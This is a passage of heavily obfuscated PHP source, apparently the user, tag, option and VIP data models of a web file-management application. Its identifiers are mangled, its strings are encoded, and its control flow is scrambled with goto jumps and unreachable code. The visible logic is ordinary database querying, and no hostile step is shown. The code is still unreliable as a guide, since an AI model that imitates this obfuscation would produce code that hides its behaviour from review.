"\x25{$bĞîùëº¿…}\45"), $EĞø¨â˜‘Ú[684] => $EĞø¨â˜‘Ú[1639]); if (Input::check($bĞîùëº¿…, $EĞø¨â˜‘Ú[303])) { $b«©Š¨İ§Ë[$EĞø¨â˜‘Ú[1095]] = array($EĞø¨â˜‘Ú[521], "\45{$bĞîùëº¿…}\x25"); $b«©Š¨İ§Ë[$EĞø¨â˜‘Ú[1932]] = array($EĞø¨â˜‘Ú[521], "\x25{$bĞîùëº¿…}\x25"); } goto f‚„Û†×µ; eáÔœÀ¬«ó: } private function _filterByGroup(&$E¡¡ğéù±‹, $e¶ä…ÊÀğ¤) { $CÔ§½ñÚï =& $_SERVER[İë¬“ÅÒÛ›]; if (!$e¶ä…ÊÀğ¤) { return $E¡¡ğéù±‹; } foreach ($E¡¡ğéù±‹[$CÔ§½ñÚï[357]] as $eË¥ßÚ•ªš => &$eœ…·ö“Ô) { $cÄ¡ˆ„õš« = array_to_keyvalue($eœ…·ö“Ô[$CÔ§½ñÚï[1956]], $CÔ§½ñÚï[33], $CÔ§½ñÚï[1546]); if (!in_array($e¶ä…ÊÀğ¤, $cÄ¡ˆ„õš«)) { unset($E¡¡ğéù±‹[$CÔ§½ñÚï[357]][$eË¥ßÚ•ªš]); } } $E¡¡ğéù±‹[$CÔ§½ñÚï[357]] = array_values($E¡¡ğéù±‹[$CÔ§½ñÚï[357]]); $E¡¡ğéù±‹[$CÔ§½ñÚï[354]] = array($CÔ§½ñÚï[1957] => count($E¡¡ğéù±‹[$CÔ§½ñÚï[357]]), $CÔ§½ñÚï[1958] => $E¡¡ğéù±‹[$CÔ§½ñÚï[354]][$CÔ§½ñÚï[352]], $CÔ§½ñÚï[1959] => 1, $CÔ§½ñÚï[1960] => 1); } private function _filterUserList(&$b¥À ‡§¡) { $e¦±™¼”¿Š =& $_SERVER[İë¬“ÅÒÛ›]; foreach ($b¥À ‡§¡[$e¦±™¼”¿Š[357]] as $DŠ÷Ë‘¤Î => &$a´³áÃÑ…Ø) { unset($a´³áÃÑ…Ø[$e¦±™¼”¿Š[1592]]); } } private function _searchFromMeta($cò·Óã…ŸŞ, $b–‡°ÜÍæ¸, $eğ¶çÈ¸•ç) { goto eÌÑî±Šõ; eÏ§®èİÇ: $aŞ”ÅËÏ Ë = $this->where(array($D¹©Íøã[1086] => array($D¹©Íøã[7], $eì‰Ğê)))->select(); if (!$aŞ”ÅËÏ Ë) { return array(); } return $aŞ”ÅËÏ Ë; goto f»ç¬âÆÈ; eÌÑî±Šõ: $D¹©Íøã =& $_SERVER[İë¬“ÅÒÛ›]; $b–‡°ÜÍæ¸ = strtolower($b–‡°ÜÍæ¸); $F¤·Îàù = array($D¹©Íøã[88] => $cò·Óã…ŸŞ, $D¹©Íøã[360] => array($D¹©Íøã[521], "\x25{$b–‡°ÜÍæ¸}\x25")); goto Cà±¤ö°‚¦; Cà±¤ö°‚¦: $eì‰Ğê = Model($D¹©Íøã[1961])->where($F¤·Îàù)->limit($eğ¶çÈ¸•ç)->select(); if (!$eì‰Ğê) { return array(); } $eì‰Ğê = array_to_keyvalue($eì‰Ğê, $D¹©Íøã[33], $D¹©Íøã[1095]); goto eÏ§®èİÇ; f»ç¬âÆÈ: } private function _listDataApplyItem($aÛİŠ©ğØä) { $F›¤„×Ü÷¦ = array($aÛİŠ©ğØä); $this->_listDataApply($F›¤„×Ü÷¦); return $F›¤„×Ü÷¦[0]; } private function _listDataApply(&$cÖ ¨‰î²¿, $eÓÀÑ“Øõ = "\x67\162\157\165\x70\x2c\155\x65\x74\141\54\163\157\165\162\x63\x65") { goto D ©’Úá¢; A–¿ÁÃÖà: if (in_array($Fš±¡ˆ†¯Á[1962], $eÓÀÑ“Øõ)) { $this->_listAppendMeta($cÖ ¨‰î²¿, $DØ¢˜†ÈÈâ); } if (in_array($Fš±¡ˆ†¯Á[986], $eÓÀÑ“Øõ)) { $this->_listAppendSourceRoot($cÖ ¨‰î²¿, $DØ¢˜†ÈÈâ); } goto BÌ‘‹Ëò´´; D ©’Úá¢: $Fš±¡ˆ†¯Á =& $_SERVER[İë¬“ÅÒÛ›]; if (!$cÖ ¨‰î²¿) { return; } array_remove_key($cÖ ¨‰î²¿, $Fš±¡ˆ†¯Á[567]); goto bÜ´ñ¤„Á÷; bÜ´ñ¤„Á÷: $DØ¢˜†ÈÈâ = array_to_keyvalue($cÖ ¨‰î²¿, $Fš±¡ˆ†¯Á[33], $Fš±¡ˆ†¯Á[1095]); $eÓÀÑ“Øõ = explode($Fš±¡ˆ†¯Á[47], $eÓÀÑ“Øõ); if (in_array($Fš±¡ˆ†¯Á[741], $eÓÀÑ“Øõ)) { $this->_listAppendGroup($cÖ ¨‰î²¿, $DØ¢˜†ÈÈâ); } goto A–¿ÁÃÖà; BÌ‘‹Ëò´´: } private function _listAppendSourceRoot(&$FÌ…ôåèå³, $d—†Ò¢Ÿ…) { $d¶šá“¿Á† =& $_SERVER[İë¬“ÅÒÛ›]; $fÜ¯®êˆ› = array($d¶šá“¿Á†[394] => SourceModel::TYPE_USER, $d¶šá“¿Á†[385] => 0, $d¶šá“¿Á†[396] => array($d¶šá“¿Á†[7], $d—†Ò¢Ÿ…)); $dèšêßîí = Model($d¶šá“¿Á†[522])->field($d¶šá“¿Á†[1963])->where($fÜ¯®êˆ›)->select(); $dèšêßîí = array_to_keyvalue($dèšêßîí, $d¶šá“¿Á†[396]); $dèšêßîí = array_remove_key($dèšêßîí, $d¶šá“¿Á†[396]); foreach ($FÌ…ôåèå³ as &$b•Š†§­àƒ) { $b•Š†§­àƒ[$d¶šá“¿Á†[861]] = $dèšêßîí[$b•Š†§­àƒ[$d¶šá“¿Á†[1095]]] ? $dèšêßîí[$b•Š†§­àƒ[$d¶šá“¿Á†[1095]]] : array(); } } private function _listAppendGroup(&$Dİ™·‡•ùº, $e„ƒ¼¼¯Î) { goto Fø˜õµ‚«; fô’ËšóŠÍ: $dõ–Ñˆ©Ú = array($cİÉÃĞ[1546] => array($cİÉÃĞ[7], $AîÏéåƒµØ)); $Fù¼ÍõÁ… = Model($cİÉÃĞ[1964])->field($cİÉÃĞ[1965])->where($dõ–Ñˆ©Ú)->select(); $aÊ÷ºÒ™÷¾ = array_to_keyvalue($Fù¼ÍõÁ…, $cİÉÃĞ[1546], $cİÉÃĞ[28]); goto Céƒ¡“‡´‘; Fø˜õµ‚«: $cİÉÃĞ =& $_SERVER[İë¬“ÅÒÛ›]; $dõ–Ñˆ©Ú = array($cİÉÃĞ[1095] => array($cİÉÃĞ[7], $e„ƒ¼¼¯Î)); $eßˆ…÷–á = Model($cİÉÃĞ[1631])->where($dõ–Ñˆ©Ú)->select(); goto Bâ®Ÿ‹¹á; Bâ®Ÿ‹¹á: $AîÏéåƒµØ = array_to_keyvalue($eßˆ…÷–á, $cİÉÃĞ[33], $cİÉÃĞ[1546]); $AîÏéåƒµØ = array_remove_value(array_unique($AîÏéåƒµØ), $cİÉÃĞ[403]); if (!$AîÏéåƒµØ || !$eßˆ…÷–á) { return; } goto fô’ËšóŠÍ; Céƒ¡“‡´‘: $eßˆ…÷–á = array_to_keyvalue_group($eßˆ…÷–á, $cİÉÃĞ[1095]); foreach ($eßˆ…÷–á as &$B£êñ©Õ‘Ô) { $Fğ‘äòãä© = array(); foreach ($B£êñ©Õ‘Ô as $aê”“óÌ¸) { if (!$aê”“óÌ¸[$cİÉÃĞ[1683]]) { continue; } $c„¼õÙÏ† = Model($cİÉÃĞ[1699])->listData($aê”“óÌ¸[$cİÉÃĞ[1683]]); $Fğ‘äòãä©[] = array($cİÉÃĞ[1546] => $aê”“óÌ¸[$cİÉÃĞ[1546]], $cİÉÃĞ[1966] => $aÊ÷ºÒ™÷¾[$aê”“óÌ¸[$cİÉÃĞ[1546]]], $cİÉÃĞ[550] => $c„¼õÙÏ†); } $B£êñ©Õ‘Ô = $Fğ‘äòãä©; } foreach ($Dİ™·‡•ùº as &$CšÜø†Ã) { $CšÜø†Ã[$cİÉÃĞ[1956]] = array(); if (isset($eßˆ…÷–á[$CšÜø†Ã[$cİÉÃĞ[1095]]])) { $CšÜø†Ã[$cİÉÃĞ[1956]] = $eßˆ…÷–á[$CšÜø†Ã[$cİÉÃĞ[1095]]]; } } goto a¦‘İÄ™—¥; a¦‘İÄ™—¥: } private function _listAppendMeta(&$Fã§ĞŠ®…, $d¿áİßèÄ) { goto D®ëÛãó‚°; EÏËÉ­¨‡÷: $BÒÑ›ÓŒ£“ = array($d§ËÁÈàË‚[1095] => array($d§ËÁÈàË‚[7], $d¿áİßèÄ)); $Bœâ–ÆÑÀõ = Model($d§ËÁÈàË‚[1931])->where($BÒÑ›ÓŒ£“)->select(); $Bœâ–ÆÑÀõ = array_to_keyvalue_group($Bœâ–ÆÑÀõ, $d§ËÁÈàË‚[1095]); goto eÜºœ¼; eÜºœ¼: foreach ($Bœâ–ÆÑÀõ as &$E‹ùŠÚ¹) { $BŞ­˜Ùˆ—Å = array(); foreach ($E‹ùŠÚ¹ as $D°ÉÊ´ŠÙ) { if (!in_array($D°ÉÊ´ŠÙ[$d§ËÁÈàË‚[88]], $bÍ»°öä—)) { $BŞ­˜Ùˆ—Å[$D°ÉÊ´ŠÙ[$d§ËÁÈàË‚[88]]] = $D°ÉÊ´ŠÙ[$d§ËÁÈàË‚[360]]; } } $E‹ùŠÚ¹ = $BŞ­˜Ùˆ—Å; } $dÑ“Û³Á¥´ = Model($d§ËÁÈàË‚[1967]); foreach ($Fã§ĞŠ®… as &$ağØ˜Âë‘ø) { $ağØ˜Âë‘ø[$d§ËÁÈàË‚[1592]] = array(); $ağØ˜Âë‘ø[$d§ËÁÈàË‚[1968]] = array(); if (isset($Bœâ–ÆÑÀõ[$ağØ˜Âë‘ø[$d§ËÁÈàË‚[1095]]])) { $ağØ˜Âë‘ø[$d§ËÁÈàË‚[1592]] = $Bœâ–ÆÑÀõ[$ağØ˜Âë‘ø[$d§ËÁÈàË‚[1095]]]; } if (isset($ağØ˜Âë‘ø[$d§ËÁÈàË‚[1592]][$Fä‰Œ‚ê‘Ğ])) { $ağØ˜Âë‘ø[$d§ËÁÈàË‚[1968]] = $dÑ“Û³Á¥´->getUserJobInfo($ağØ˜Âë‘ø[$d§ËÁÈàË‚[1592]][$Fä‰Œ‚ê‘Ğ]); } } goto d’÷¦ƒã˜ä; D®ëÛãó‚°: $d§ËÁÈàË‚ =& $_SERVER[İë¬“ÅÒÛ›]; $Fä‰Œ‚ê‘Ğ = UserJobModel::JOB_KEY; $bÍ»°öä— = array($d§ËÁÈàË‚[1934]); goto EÏËÉ­¨‡÷; d’÷¦ƒã˜ä: } public function userSearch($e´ÅÉæËÌ÷, $bÔ¥îÏº¹É = "\x2a") { return Model($_SERVER[İë¬“ÅÒÛ›][1481])->where($e´ÅÉæËÌ÷)->field($bÔ¥îÏº¹É)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\x6f\x70\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Cº¿—ã±×) { return "\x55\x73\x65\162\117\x70\164\x69\x6f\156\137{$Cº¿—ã±×}\x5f" . USER_ID; } protected function filterWhere($bºÑ—ñ·¦) { $bºÑ—ñ·¦[$_SERVER[İë¬“ÅÒÛ›][1095]] = USER_ID; return $bºÑ—ñ·¦; } public function cacheRemoveUser($CõÙìäˆ„à, $C‘¿µË×…) { return Cache::remove("\x55\x73\145\x72\x4f\x70\x74\x69\x6f\x6e\137{$CõÙìäˆ„à}\137" . $C‘¿µË×…); } public function get($d³ºŠËÀ¼ = false, $Déä›ôŠ´ = '', $EºÜ‘‰ƒÄ = false) { goto d“ÜèŠóã¹; d“ÜèŠóã¹: $eÇìßºï¸º =& $_SERVER[İë¬“ÅÒÛ›]; $fŞ»—óõ²¶ = parent::get($d³ºŠËÀ¼, $Déä›ôŠ´, $EºÜ‘‰ƒÄ); if (!is_null($fŞ»—óõ²¶)) { return $fŞ»—óõ²¶; } goto aÃ°Ô§Õèœ; aÃ°Ô§Õèœ: global $config; $Eƒ ±»Øª = array($eÇìßºï¸º[33] => $eÇìßºï¸º[1969], $eÇìßºï¸º[1970] => $eÇìßºï¸º[1971]); $b‡“Ï–â“¼ = $config[$Eƒ ±»Øª[$Déä›ôŠ´]]; goto eîË³ËŒÖØ; eîË³ËŒÖØ: if (!$d³ºŠËÀ¼) { return $b‡“Ï–â“¼; } else { return $b‡“Ï–â“¼[$d³ºŠËÀ¼]; } goto BÈ­õ²Ìéã; BÈ­õ²Ìéã: } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\x2e\164\x61\147\x4c\x69\x73\164"; public $modelType = "\x55\x73\145\162\117\x70\x74\151\x6f\x6e"; public $field = array("\x6e\x61\155\x65", "\163\x74\171\x6c\x65", "\x73\x6f\162\164"); public function listData($d¹é­Á§ë† = false, $eÚ¦¯·õ” = "\163\x6f\x72\x74", $e¥Ğ‹ÊÁœ´ = false) { return parent::listData($d¹é­Á§ë†, $eÚ¦¯·õ”, $e¥Ğ‹ÊÁœ´); } public function remove($eŠì§Óàš³) { return parent::remove($eŠì§Óàš³); } public function add($AÚ½»á£‰, $cáÂøÖÒÉ” = "\x6c\x61\x62\145\x6c\x2d\x67\x72\x65\x79\55\156\157\162\155\141\154") { $f¥‡ÅÔ…´Ø =& $_SERVER[İë¬“ÅÒÛ›]; if ($this->findByName($AÚ½»á£‰)) { return !1; } $D’¨´”¢· = array($f¥‡ÅÔ…´Ø[388] => $AÚ½»á£‰, $f¥‡ÅÔ…´Ø[1972] => $cáÂøÖÒÉ”, $f¥‡ÅÔ…´Ø[1550] => $this->getSort($f¥‡ÅÔ…´Ø[250]) + 1); return parent::insert($D’¨´”¢·); } public function update($fÙåÛˆ¾†Æ, $F£˜ÉÜƒˆ) { $DàªÏ„•ºŸ =& $_SERVER[İë¬“ÅÒÛ›]; $DŸŒ”¸ÏŞ’ = $this->listData($fÙåÛˆ¾†Æ); $A×¯Ğ¬ƒë = $this->findByName($F£˜ÉÜƒˆ[$DàªÏ„•ºŸ[28]]); if (!$DŸŒ”¸ÏŞ’ || $A×¯Ğ¬ƒë && $A×¯Ğ¬ƒë[$DàªÏ„•ºŸ[369]] != $DŸŒ”¸ÏŞ’[$DàªÏ„•ºŸ[369]]) { return !1; } return parent::update($fÙåÛˆ¾†Æ, $F£˜ÉÜƒˆ); } public function moveTop($fÉ¬àèÖ¿Ÿ) { $Aã×¬¢Ä¹Ä =& $_SERVER[İë¬“ÅÒÛ›]; $e¼ƒ±•¡İ› = parent::listData(); $eÓ‹¿ÓìèÙ = $this->getSort($Aã×¬¢Ä¹Ä[249]); foreach ($e¼ƒ±•¡İ› as &$cÆÓÌÒé•«) { if ($cÆÓÌÒé•«[$Aã×¬¢Ä¹Ä[369]] == $fÉ¬àèÖ¿Ÿ) { $cÆÓÌÒé•«[$Aã×¬¢Ä¹Ä[1567]] = $eÓ‹¿ÓìèÙ; continue; } $cÆÓÌÒé•«[$Aã×¬¢Ä¹Ä[1567]] += 1; } return parent::resetData($e¼ƒ±•¡İ›); } public function moveBottom($e‚«”ìã¿¹) { $EÏÖÃ›Í¬µ =& $_SERVER[İë¬“ÅÒÛ›]; $FËÎ¦ËŒ„ = $this->getSort($EÏÖÃ›Í¬µ[250]) + 1; return parent::update($e‚«”ìã¿¹, array($EÏÖÃ›Í¬µ[1567] => $FËÎ¦ËŒ„)); } public function resetSort($dƒ¿óÜí¡) { $cøÆÍ…œ =& $_SERVER[İë¬“ÅÒÛ›]; $A±±«íŠÔ™ = array(); for ($A¥²§‹‡ªÊ = 0; $A¥²§‹‡ªÊ < count($dƒ¿óÜí¡); $A¥²§‹‡ªÊ++) { $A±±«íŠÔ™[$dƒ¿óÜí¡[$A¥²§‹‡ªÊ] . $cøÆÍ…œ[33]] = $A¥²§‹‡ªÊ + 1; } $bÆõ·ÚÕ³ = parent::listData(); foreach ($bÆõ·ÚÕ³ as &$Fì¬ƒ³ğõŸ) { $BÜãïÙ„Ù® = $A±±«íŠÔ™[$Fì¬ƒ³ğõŸ[$cøÆÍ…œ[369]]]; $Fì¬ƒ³ğõŸ[$cøÆÍ…œ[1567]] = $BÜãïÙ„Ù® ? $BÜãïÙ„Ù® : $Fì¬ƒ³ğõŸ[$cøÆÍ…œ[1567]]; } return parent::resetData($bÆõ·ÚÕ³); } private function getSort($cÖÎ¯›Œ·ù) { $aÒ¶«½Œ©ù =& $_SERVER[İë¬“ÅÒÛ›]; $fÖßŒÕŠ“Ä = parent::listData(); $EİÕÎ¶êğ° = array_to_keyvalue($fÖßŒÕŠ“Ä, $aÒ¶«½Œ©ù[33], $aÒ¶«½Œ©ù[1567]); if (!$EİÕÎ¶êğ°) { $EİÕÎ¶êğ° = array(0); } $f«¥ÑœÄƒ¡ = $cÖÎ¯›Œ·ù == $aÒ¶«½Œ©ù[250] ? max($EİÕÎ¶êğ°) : min($EİÕÎ¶êğ°); return intval($f«¥ÑœÄƒ¡); } } goto FçÜĞğ–Î‰; a¡Š¡ó‚Æî: class VipModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\157\160\164\151\x6f\156"; public function edit($d­×†ª†…, $A¦­ğ«‡×) { goto a±¯Œô¨´’; a±¯Œô¨´’: $dç÷ÛßÆ² =& $_SERVER[İë¬“ÅÒÛ›]; $fÜÑ»Ø–îÒ = json_encode($A¦­ğ«‡×); $A‡»£ºÜÛŒ = array($dç÷ÛßÆ²[1095] => $d­×†ª†…, $dç÷ÛßÆ²[29] => $dç÷ÛßÆ²[1977], $dç÷ÛßÆ²[88] => $dç÷ÛßÆ²[1978]); goto C³‡¥¤ƒÏŞ; Fë‚–½ôÉ : return $fŒÑæïß†æ; goto D»ç®„¼í×; C³‡¥¤ƒÏŞ: if (!$this->where($A‡»£ºÜÛŒ)->find()) { $A‡»£ºÜÛŒ[$dç÷ÛßÆ²[360]] = $fÜÑ»Ø–îÒ; return $this->add($A‡»£ºÜÛŒ); } $fŒÑæïß†æ = $this->where($A‡»£ºÜÛŒ)->save(array($dç÷ÛßÆ²[360] => $fÜÑ»Ø–îÒ)); Cache::remove($dç÷ÛßÆ²[1979] . $d­×†ª†…); goto Fë‚–½ôÉ ; D»ç®„¼í×: } public function vipList($C´è‡‹£ß) { goto d¿°¿ÙÍ‡‰; d¿°¿ÙÍ‡‰: $aƒñëã÷°Ì =& $_SERVER[İë¬“ÅÒÛ›]; $dõÕìœÊëÜ = array($aƒñëã÷°Ì[29] => $aƒñëã÷°Ì[1977], $aƒñëã÷°Ì[88] => $aƒñëã÷°Ì[1978]); if (!empty($C´è‡‹£ß[$aƒñëã÷°Ì[460]])) { $E°¾ßÅêà = $C´è‡‹£ß[$aƒñëã÷°Ì[460]]; $e¶Ã¯† ª¼ = !empty($C´è‡‹£ß[$aƒñëã÷°Ì[461]]) ? $C´è‡‹£ß[$aƒñëã÷°Ì[461]] : time(); $dõÕìœÊëÜ[$aƒñëã÷°Ì[187]] = array($aƒñëã÷°Ì[325], array($E°¾ßÅêà, $e¶Ã¯† ª¼)); } goto F¾±ä‹ääà; b¢À¼ˆàŞĞ: $this->_listUserApply($eİ‘ÜìÏ‘¶[$aƒñëã÷°Ì[357]]); return $eİ‘ÜìÏ‘¶; goto CŞÇ³†–Ç; F¾±ä‹ääà: if (in_array($C´è‡‹£ß[$aƒñëã÷°Ì[29]], array($aƒñëã÷°Ì[1980], $aƒñëã÷°Ì[1981]))) { $dõÕìœÊëÜ[$aƒñëã÷°Ì[360]] = array($aƒñëã÷°Ì[521], "\x25{$C´è‡‹£ß[$aƒñëã÷°Ì[29]]}\x25"); } $eİ‘ÜìÏ‘¶ = $this->where($dõÕìœÊëÜ)->selectPage(); if (empty($eİ‘ÜìÏ‘¶[$aƒñëã÷°Ì[357]])) { show_json(array(), !0, $eİ‘ÜìÏ‘¶[$aƒñëã÷°Ì[354]]); } goto b¢À¼ˆàŞĞ; CŞÇ³†–Ç: } private function _listUserApply(&$d£òÈ‘Ôé˜) { goto aÇÜ³ÉêÓ; aÇÜ³ÉêÓ: $aÔŒ‡„° =& $_SERVER[İë¬“ÅÒÛ›]; $AÑôƒ…¾²ã = array_to_keyvalue($d£òÈ‘Ôé˜, $aÔŒ‡„°[33], $aÔŒ‡„°[1095]); $AÃäÂ‡Ô° = Model($aÔŒ‡„°[1481])->userListInfo(array_unique($AÑôƒ…¾²ã)); goto c‹²¥š›±; D¿ï‘Ÿ Èø: $B©ŸÂÇ¢ù = array($aÔŒ‡„°[369], $aÔŒ‡„°[1095], $aÔŒ‡„°[187], $aÔŒ‡„°[106]); foreach ($d£òÈ‘Ôé˜ as $AĞ§æèÅ° => $EŸŒ¨¤Âö¦) { $CöÎã»Å = $EŸŒ¨¤Âö¦[$aÔŒ‡„°[1095]]; $DŠÃÔæ—Ë[$AĞ§æèÅ°] = array($aÔŒ‡„°[369] => $EŸŒ¨¤Âö¦[$aÔŒ‡„°[369]], $aÔŒ‡„°[1095] => $EŸŒ¨¤Âö¦[$aÔŒ‡„°[1095]], $aÔŒ‡„°[1982] => json_decode($EŸŒ¨¤Âö¦[$aÔŒ‡„°[360]], !0), $aÔŒ‡„°[187] => $EŸŒ¨¤Âö¦[$aÔŒ‡„°[187]], $aÔŒ‡„°[106] => $EŸŒ¨¤Âö¦[$aÔŒ‡„°[106]], $aÔŒ‡„°[1688] => isset($AÃäÂ‡Ô°[$CöÎã»Å]) ? $AÃäÂ‡Ô°[$CöÎã»Å] : null); } $d£òÈ‘Ôé˜ = $DŠÃÔæ—Ë; goto Fªí±Ÿæ“Ó; c‹²¥š›±: foreach ($d£òÈ‘Ôé˜ as &$EŸŒ¨¤Âö¦) { $CöÎã»Å = $EŸŒ¨¤Âö¦[$aÔŒ‡„°[1095]]; if (isset($EŸŒ¨¤Âö¦[$aÔŒ‡„°[360]])) { $EŸŒ¨¤Âö¦[$aÔŒ‡„°[360]] = json_decode($EŸŒ¨¤Âö¦[$aÔŒ‡„°[360]], !0); } $EŸŒ¨¤Âö¦[$aÔŒ‡„°[1688]] = isset($AÃäÂ‡Ô°[$CöÎã»Å]) ? $AÃäÂ‡Ô°[$CöÎã»Å] : null; } return; $DŠÃÔæ—Ë = array(); goto D¿ï‘Ÿ Èø; Fªí±Ÿæ“Ó: } public function orderList($f¸Õ‹ÄŸ¥°) { goto FÄæÙ‹§¯; A‹š²¤«—‘: if (empty($A»Şóò••[$cŒšé–’í[357]])) { show_json(array(), !0, $A»Şóò••[$cŒšé–’í[354]]); } $this->_listUserApply($A»Şóò••[$cŒšé–’í[357]]); return $A»Şóò••; goto aé™•³İ«; A„±Æ¿Ê: if (!empty($f¸Õ‹ÄŸ¥°[$cŒšé–’í[29]])) { $DºÉÓæËÃ[$cŒšé–’í[29]] = $f¸Õ‹ÄŸ¥°[$cŒšé–’í[29]]; } if (isset($f¸Õ‹ÄŸ¥°[$cŒšé–’í[447]]) && $f¸Õ‹ÄŸ¥°[$cŒšé–’í[447]] != $cŒšé–’í[33]) { $DºÉÓæËÃ[$cŒšé–’í[447]] = $f¸Õ‹ÄŸ¥°[$cŒšé–’í[447]]; } $A»Şóò•• = Model($cŒšé–’í[1983])->where($DºÉÓæËÃ)->selectPage(); goto A‹š²¤«—‘; FÄæÙ‹§¯: $cŒšé–’í =& $_SERVER[İë¬“ÅÒÛ›]; $DºÉÓæËÃ = array(); if (!empty($f¸Õ‹ÄŸ¥°[$cŒšé–’í[460]])) { $Dªî¿‡¿ç = $f¸Õ‹ÄŸ¥°[$cŒšé–’í[460]]; $a¿é‰ôˆ„— = !empty($f¸Õ‹ÄŸ¥°[$cŒšé–’í[461]]) ? $f¸Õ‹ÄŸ¥°[$cŒšé–’í[461]] : time(); $DºÉÓæËÃ[$cŒšé–’í[187]] = array($cŒšé–’í[325], array($Dªî¿‡¿ç, $a¿é‰ôˆ„—)); } goto A„±Æ¿Ê; aé™•³İ«: } }